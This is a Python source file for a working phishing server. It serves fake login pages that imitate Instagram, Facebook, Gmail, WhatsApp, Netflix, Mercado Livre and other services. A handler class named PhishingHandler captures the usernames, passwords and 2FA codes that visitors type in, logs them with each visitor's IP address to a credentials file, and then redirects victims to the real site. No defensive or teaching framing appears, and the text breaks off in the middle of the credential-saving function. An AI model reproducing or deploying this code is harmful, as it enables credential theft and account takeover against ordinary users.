#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import threading
import http.server
import socketserver
import json
import time
import random
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# Configurações
PORT = 8080
HOST = "0.0.0.0"
DATA_FILE = "credenciais_capturadas.txt"
LOG_FILE = "servidor.log"

# Cores para output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Template base HTML
BASE_HTML = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <link rel="shortcut icon" href="{favicon}" type="image/x-icon">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }}
        
        body {{
            background: {background};
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .login-container {{
            background: #fff;
            padding: 30px;
            border-radius: {border_radius};
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }}
        
        .brand-logo {{
            text-align: center;
            margin-bottom: 25px;
        }}
        
        .brand-logo h1 {{
            font-size: 28px;
            margin-bottom: 10px;
            color: {brand_color};
        }}
        
        .brand-logo p {{
            color: #666;
            font-size: 14px;
        }}
        
        .brand-logo img {{
            max-width: 80px;
            margin-bottom: 15px;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        .form-group label {{
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #444;
        }}
        
        .form-group input {{
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 15px;
            transition: border-color 0.3s;
        }}
        
        .form-group input:focus {{
            outline: none;
            border-color: {brand_color};
            box-shadow: 0 0 0 2px {brand_color}20;
        }}
        
        .btn {{
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 6px;
            background: {brand_color};
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }}
        
        .btn:hover {{
            background: {hover_color};
        }}
        
        .footer {{
            text-align: center;
            margin-top: 25px;
            font-size: 13px;
            color: #888;
        }}
        
        .footer a {{
            color: {brand_color};
            text-decoration: none;
        }}
        
        .footer a:hover {{
            text-decoration: underline;
        }}
        
        .error-message {{
            color: #d93025;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            display: none;
        }}
        
        .success-message {{
            color: #0f9d58;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            display: none;
        }}
        
        .two-factor {{
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }}
        
        .security-notice {{
            background: #f8f9fa;
            padding: 12px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 13px;
            color: #5f6368;
        }}
        
        .language-selector {{
            position: absolute;
            top: 20px;
            right: 20px;
        }}
        
        .language-selector select {{
            padding: 8px;
            border-radius: 4px;
            border: 1px solid #ddd;
        }}
    </style>
</head>
<body>
    <div class="language-selector">
        <select onchange="changeLanguage(this.value)">
            <option value="pt">Português</option>
            <option value="es">Español</option>
            <option value="en">English</option>
        </select>
    </div>

    <div class="login-container">
        <div class="brand-logo">
            <h1>{brand_name}</h1>
            <p>{welcome_message}</p>
        </div>
        
        <form id="loginForm" method="POST">
            <div class="form-group">
                <label for="username">{username_label}</label>
                <input type="text" id="username" name="username" required placeholder="{username_placeholder}">
            </div>
            
            <div class="form-group">
                <label for="password">{password_label}</label>
                <input type="password" id="password" name="password" required placeholder="{password_placeholder}">
            </div>
            
            <div class="form-group two-factor" id="twoFactor">
                <label for="code">Código de verificação</label>
                <input type="text" id="code" name="code" placeholder="Digite o código de 6 dígitos">
            </div>
            
            <button type="submit" class="btn">{login_button}</button>
        </form>
        
        <div class="error-message" id="errorMessage">
            {error_message}
        </div>
        
        <div class="success-message" id="successMessage">
            {success_message}
        </div>
        
        <div class="security-notice">
            <strong>Proteja sua conta:</strong> Não compartilhe sua senha com ninguém. {brand_name} nunca pedirá sua senha por e-mail ou mensagem.
        </div>
        
        <div class="footer">
            <p>{footer_text_1} <a href="#">{footer_link}</a></p>
            <p>© {current_year} {brand_name}. {footer_rights}</p>
        </div>
    </div>

    <script>
        function changeLanguage(lang) {{
            // Simular mudança de idioma
            alert('Idioma alterado para ' + (lang === 'pt' ? 'Português' : lang === 'es' ? 'Español' : 'English'));
        }}
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            // Simular verificação em duas etapas (30% das vezes)
            if (Math.random() < 0.3) {{
                document.getElementById('twoFactor').style.display = 'block';
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('successMessage').innerHTML = 'Enviamos um código para seu telefone. Digite-o abaixo.';
                document.getElementById('errorMessage').style.display = 'none';
            }} else {{
                // Mostrar mensagem de sucesso
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('errorMessage').style.display = 'none';
                
                // Simular processo de login
                setTimeout(function() {{
                    document.getElementById('loginForm').submit();
                }}, 2500);
            }}
        }});
    </script>
</body>
</html>
"""

# Templates específicos para cada rede social
SOCIAL_TEMPLATES = {
    "instagram": {
        "title": "Instagram • Entre na sua conta",
        "brand_name": "Instagram",
        "brand_color": "#E1306C",
        "hover_color": "#C13584",
        "background": "linear-gradient(45deg, #8a3ab9, #e95950, #bc2a8d, #fccc63, #fbad50, #cd486b, #4c68d7)",
        "border_radius": "12px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 448 512'><path d='M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z'/></svg>",
        "welcome_message": "Entre para ver fotos e vídeos dos seus amigos.",
        "username_label": "Telefone, nome de usuário ou email",
        "username_placeholder": "Nome de usuário, email ou telefone",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "Desculpe, sua senha estava incorreta. Por favor, verifique novamente.",
        "success_message": "Login realizado com sucesso! Redirecionando...",
        "footer_text_1": "Não tem uma conta?",
        "footer_link": "Cadastre-se",
        "footer_rights": "Todos os direitos reservados.",
        "path": "/instagram"
    },
    "facebook": {
        "title": "Facebook - Entre ou Cadastre-se",
        "brand_name": "Facebook",
        "brand_color": "#1877F2",
        "hover_color": "#166FE5",
        "background": "#f0f2f5",
        "border_radius": "8px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'><path d='M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z'/></svg>",
        "welcome_message": "O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.",
        "username_label": "Email ou telefone",
        "username_placeholder": "Email ou número de telefone",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "Senha incorreta. Tente novamente ou clique em 'Esqueceu a senha?' para redefini-la.",
        "success_message": "Entrando no Facebook...",
        "footer_text_1": "Esqueceu a senha?",
        "footer_link": "Criar nova conta",
        "footer_rights": "Meta © 2023",
        "path": "/facebook"
    },
    "tiktok": {
        "title": "TikTok - Make Your Day",
        "brand_name": "TikTok",
        "brand_color": "#000000",
        "hover_color": "#333333",
        "background": "#ffffff",
        "border_radius": "4px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 448 512'><path d='M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z'/></svg>",
        "welcome_message": "Entre para curtir vídeos incríveis",
        "username_label": "Email ou nome de usuário",
        "username_placeholder": "Email ou nome de usuário",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "Senha incorreta. Tente novamente.",
        "success_message": "Login bem-sucedido! Redirecionando...",
        "footer_text_1": "Não tem uma conta?",
        "footer_link": "Inscrever-se",
        "footer_rights": "© 2023 TikTok",
        "path": "/tiktok"
    },
    "kwai": {
        "title": "Kwai - Videos Curtos",
        "brand_name": "Kwai",
        "brand_color": "#FFCC00",
        "hover_color": "#E6B800",
        "background": "linear-gradient(135deg, #FFCC00, #FF6600)",
        "border_radius": "20px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23FFCC00' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Entre para assistir a vídeos curtos divertidos",
        "username_label": "Número de telefone",
        "username_placeholder": "Número de telefone",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "Número ou senha incorretos",
        "success_message": "Login realizado! Carregando seu feed...",
        "footer_text_1": "Problemas para entrar?",
        "footer_link": "Obter ajuda",
        "footer_rights": "© Kwai 2023",
        "path": "/kwai"
    },
    "whatsapp": {
        "title": "WhatsApp Web",
        "brand_name": "WhatsApp",
        "brand_color": "#25D366",
        "hover_color": "#128C7E",
        "background": "#f0f2f5",
        "border_radius": "0px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 448 512'><path d='M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z'/></svg>",
        "welcome_message": "Use o WhatsApp no seu computador",
        "username_label": "Número de telefone",
        "username_placeholder": "Seu número com código do país",
        "password_label": "Seu nome",
        "password_placeholder": "Seu nome completo",
        "login_button": "Conectar",
        "error_message": "Falha ao conectar. Verifique seu número.",
        "success_message": "Conectando ao WhatsApp...",
        "footer_text_1": "Ou entre com",
        "footer_link": "Código QR",
        "footer_rights": "© 2023 WhatsApp LLC",
        "path": "/whatsapp"
    },
    "mercadolivre": {
        "title": "Mercado Livre - Entrar",
        "brand_name": "Mercado Livre",
        "brand_color": "#FFF159",
        "hover_color": "#E6D950",
        "background": "#EBEBEB",
        "border_radius": "6px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23FFF159' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Entre para comprar e vender",
        "username_label": "E-mail, CPF ou usuário",
        "username_placeholder": "E-mail, CPF ou usuário",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "Usuário e/ou senha inválidos.",
        "success_message": "Login realizado com sucesso!",
        "footer_text_1": "Não tem uma conta?",
        "footer_link": "Cadastre-se",
        "footer_rights": "Copyright © 1999-2023 MercadoLivre Brasil",
        "path": "/mercadolivre"
    },
    "shopee": {
        "title": "Shopee - Entrar",
        "brand_name": "Shopee",
        "brand_color": "#EE4D2D",
        "hover_color": "#D44326",
        "background": "#FFFFFF",
        "border_radius": "4px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23EE4D2D' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Entre para comprar com os melhores preços",
        "username_label": "Telefone/E-mail/Usuário",
        "username_placeholder": "Telefone, e-mail ou usuário",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "Nome de usuário/senha incorretos.",
        "success_message": "Login bem-sucedido! Redirecionando...",
        "footer_text_1": "Não tem uma conta?",
        "footer_link": "Cadastre-se",
        "footer_rights": "© 2023 Shopee. Todos os direitos reservados.",
        "path": "/shopee"
    },
    "twitter": {
        "title": "Entrar no X",
        "brand_name": "X",
        "brand_color": "#000000",
        "hover_color": "#333333",
        "background": "#FFFFFF",
        "border_radius": "16px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23000000' d='M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z'/></svg>",
        "welcome_message": "Acontecendo agora",
        "username_label": "Telefone, e-mail ou nome de usuário",
        "username_placeholder": "Telefone, e-mail ou nome de usuário",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "O nome de usuário e a senha que você inseriu não coincidem com nossos registros.",
        "success_message": "Login realizado com sucesso!",
        "footer_text_1": "Não tem uma conta?",
        "footer_link": "Inscrever-se",
        "footer_rights": "© 2023 X Corp.",
        "path": "/twitter"
    },
    "youtube": {
        "title": "YouTube - Entrar",
        "brand_name": "YouTube",
        "brand_color": "#FF0000",
        "hover_color": "#CC0000",
        "background": "#FFFFFF",
        "border_radius": "8px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 576 512'><path d='M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z'/></svg>",
        "welcome_message": "Entre para acessar seus vídeos e inscrições",
        "username_label": "E-mail ou telefone",
        "username_placeholder": "Seu e-mail ou telefone",
        "password_label": "Digite sua senha",
        "password_placeholder": "Senha",
        "login_button": "Próxima",
        "error_message": "Senha incorreta. Tente novamente ou clique em 'Esqueceu a senha?' para redefini-la.",
        "success_message": "Login realizado! Redirecionando...",
        "footer_text_1": "Precisa de ajuda?",
        "footer_link": "Esqueci minha senha",
        "footer_rights": "© 2023 Google LLC",
        "path": "/youtube"
    },
    "gmail": {
        "title": "Fazer login - Gmail",
        "brand_name": "Gmail",
        "brand_color": "#EA4335",
        "hover_color": "#D33426",
        "background": "#FFFFFF",
        "border_radius": "8px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23EA4335' d='M24 5.457v13.909c0 .904-.732 1.636-1.636 1.636h-3.819V11.73L12 16.64l-6.545-4.91v9.273H1.636A1.636 1.636 0 0 1 0 19.366V5.457c0-2.023 2.309-3.178 3.927-1.964L5.455 4.64 12 9.548l6.545-4.91 1.528-1.145C21.69 2.28 24 3.434 24 5.457z'/></svg>",
        "welcome_message": "Fazer login",
        "username_label": "E-mail ou telefone",
        "username_placeholder": "Seu e-mail",
        "password_label": "Digite sua senha",
        "password_placeholder": "Sua senha",
        "login_button": "Próxima",
        "error_message": "Não foi possível encontrar sua Conta do Google",
        "success_message": "Login realizado! Redirecionando...",
        "footer_text_1": "Precisa de ajuda?",
        "footer_link": "Esqueci meu e-mail",
        "footer_rights": "© 2023 Google LLC",
        "path": "/gmail"
    },
    "linkedin": {
        "title": "Entrar | LinkedIn",
        "brand_name": "LinkedIn",
        "brand_color": "#0A66C2",
        "hover_color": "#004182",
        "background": "#F3F2EF",
        "border_radius": "8px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 448 512'><path d='M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z'/></svg>",
        "welcome_message": "Acelere sua carreira",
        "username_label": "E-mail ou telefone",
        "username_placeholder": "E-mail ou telefone",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "Isso não corresponde à nossa documentação.",
        "success_message": "Login realizado! Redirecionando...",
        "footer_text_1": "Novo no LinkedIn?",
        "footer_link": "Junte-se agora",
        "footer_rights": "© 2023 LinkedIn Corporation",
        "path": "/linkedin"
    },
    "netflix": {
        "title": "Netflix Brasil - Assistir a Séries Online, Assistir a Filmes Online",
        "brand_name": "Netflix",
        "brand_color": "#E50914",
        "hover_color": "#B80710",
        "background": "#000000",
        "border_radius": "4px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23E50914' d='M5.398 0v.006c-1.589.072-2.886.384-3.926 1.01C.435 1.659.045 2.632.045 3.823v16.354c0 1.152.39 2.124 1.427 2.807 1.04.683 2.337.995 3.926 1.067V24h14.18v-.949c1.589-.072 2.886-.384 3.926-1.067 1.037-.683 1.427-1.655 1.427-2.807V3.823c0-1.191-.39-2.164-1.427-2.807C22.464.343 21.167.031 19.578v-.006H5.398zm14.18 6.678v10.644V6.678zm-14.18 0v10.644V6.678z'/></svg>",
        "welcome_message": "Entre para assistir a séries e filmes",
        "username_label": "E-mail ou número de telefone",
        "username_placeholder": "E-mail ou número de telefone",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "Senha incorreta. Tente novamente ou redefina sua senha.",
        "success_message": "Login realizado! Carregando Netflix...",
        "footer_text_1": "Novo por aqui?",
        "footer_link": "Assine agora",
        "footer_rights": "© 2023 Netflix, Inc.",
        "path": "/netflix"
    },
    "telegram": {
        "title": "Telegram",
        "brand_name": "Telegram",
        "brand_color": "#0088CC",
        "hover_color": "#006699",
        "background": "linear-gradient(180deg, #0088CC 0%, #005580 100%)",
        "border_radius": "10px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%230088CC' d='M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.05 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.652-.64.136-.954l11.566-4.458c.538-.196 1.006.128.832.941z'/></svg>",
        "welcome_message": "Entre no Telegram",
        "username_label": "Número de telefone",
        "username_placeholder": "Seu número de telefone",
        "password_label": "Senha (opcional)",
        "password_placeholder": "Senha (se configurada)",
        "login_button": "Próximo",
        "error_message": "Número de telefone inválido",
        "success_message": "Enviando código de verificação...",
        "footer_text_1": "Problemas para entrar?",
        "footer_link": "Suporte",
        "footer_rights": "© 2023 Telegram",
        "path": "/telegram"
    },
    "pinterest": {
        "title": "Pinterest - Entrar",
        "brand_name": "Pinterest",
        "brand_color": "#E60023",
        "hover_color": "#AD081B",
        "background": "#FFFFFF",
        "border_radius": "16px",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'><path d='M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z'/></svg>",
        "welcome_message": "Encontre ideias para todos os seus projetos",
        "username_label": "E-mail",
        "username_placeholder": "E-mail",
        "password_label": "Senha",
        "password_placeholder": "Senha",
        "login_button": "Entrar",
        "error_message": "Senha incorreta. Tente novamente.",
        "success_message": "Login realizado! Redirecionando...",
        "footer_text_1": "Não tem uma conta?",
        "footer_link": "Cadastre-se",
        "footer_rights": "© 2023 Pinterest",
        "path": "/pinterest"
    }
}

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Log da requisição
        self.log_request()
        
        # Verificar se a rota corresponde a alguma rede social
        for social, config in SOCIAL_TEMPLATES.items():
            if self.path == config["path"] or self.path == config["path"] + "/":
                self.send_login_page(social)
                return
                
        # Página inicial com lista de redes sociais
        if self.path == "/":
            self.send_index_page()
            return
            
        # Servir arquivos estáticos se existirem
        if self.path.endswith(('.css', '.js', '.png', '.jpg', '.ico')):
            super().do_GET()
            return
            
        # Página não encontrada
        self.send_error(404, "Página não encontrada")
        
    def do_POST(self):
        # Processar dados de login
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)
        
        # Extrair username e password
        username = form_data.get('username', [''])[0]
        password = form_data.get('password', [''])[0]
        code = form_data.get('code', [''])[0]
        
        # Determinar de qual rede social veio o login
        social = "unknown"
        for s, config in SOCIAL_TEMPLATES.items():
            if self.path == config["path"]:
                social = s
                break
                
        # Salvar dados
        self.save_credentials(social, username, password, code)
        
        # Redirecionar para página oficial
        redirect_url = self.get_redirect_url(social)
        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.end_headers()
        
    def send_login_page(self, social):
        if social not in SOCIAL_TEMPLATES:
            self.send_error(404, "Rede social não encontrada")
            return
            
        config = SOCIAL_TEMPLATES[social]
        current_year = datetime.now().year
        
        # Gerar HTML personalizado
        html_content = BASE_HTML.format(
            title=config["title"],
            brand_name=config["brand_name"],
            brand_color=config["brand_color"],
            hover_color=config["hover_color"],
            background=config["background"],
            border_radius=config["border_radius"],
            favicon=config["favicon"],
            welcome_message=config["welcome_message"],
            username_label=config["username_label"],
            username_placeholder=config["username_placeholder"],
            password_label=config["password_label"],
            password_placeholder=config["password_placeholder"],
            login_button=config["login_button"],
            error_message=config["error_message"],
            success_message=config["success_message"],
            footer_text_1=config["footer_text_1"],
            footer_link=config["footer_link"],
            footer_rights=config["footer_rights"],
            current_year=current_year
        )
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
        
    def send_index_page(self):
        html_content = """
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Central de Redes Sociais</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #667eea, #764ba2);
                    color: #fff;
                    min-height: 100vh;
                    padding: 40px 20px;
                }
                
                .container {
                    max-width: 1200px;
                    margin: 0 auto;
                }
                
                header {
                    text-align: center;
                    margin-bottom: 40px;
                }
                
                header h1 {
                    font-size: 36px;
                    margin-bottom: 10px;
                }
                
                header p {
                    font-size: 18px;
                    opacity: 0.9;
                }
                
                .socials-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
                    gap: 20px;
                }
                
                .social-card {
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 12px;
                    padding: 25px;
                    text-align: center;
                    transition: transform 0.3s, box-shadow 0.3s;
                    cursor: pointer;
                    backdrop-filter: blur(10px);
                }
                
                .social-card:hover {
                    transform: translateY(-5px);
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
                    background: rgba(255, 255, 255, 0.15);
                }
                
                .social-card h2 {
                    margin: 15px 0;
                    font-size: 20px;
                }
                
                .social-card a {
                    display: inline-block;
                    padding: 10px 20px;
                    background: #fff;
                    color: #333;
                    text-decoration: none;
                    border-radius: 6px;
                    font-weight: bold;
                    transition: background 0.3s;
                }
                
                .social-card a:hover {
                    background: #eee;
                }
                
                footer {
                    text-align: center;
                    margin-top: 50px;
                    opacity: 0.7;
                    font-size: 14px;
                }
                
                @media (max-width: 768px) {
                    .socials-grid {
                        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <h1>Central de Redes Sociais</h1>
                    <p>Selecione uma rede social para fazer login</p>
                </header>
                
                <div class="socials-grid">
        """
        
        # Adicionar cards para cada rede social
        for social, config in SOCIAL_TEMPLATES.items():
            html_content += f"""
                    <div class="social-card">
                        <h2>{config['brand_name']}</h2>
                        <a href="{config['path']}">Fazer Login</a>
                    </div>
            """
        
        html_content += """
                </div>
                
                <footer>
                    <p>© 2023 Central de Redes Sociais. Todos os direitos reservados.</p>
                </footer>
            </div>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
        
    def save_credentials(self, social, username, password, code=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = self.client_address[0]
        
        data = f"[{timestamp}] [{ip_address}] [{social}] Usuário: {username} | Senha: {password}"
        if code:
            data += f" | 2FA: {code}"
        data += "\n"
        
        # Salvar em arquivo
        with open(DATA_FILE, "a", encoding="utf-8") as f:
            f.write(data)
            
        # Log no console
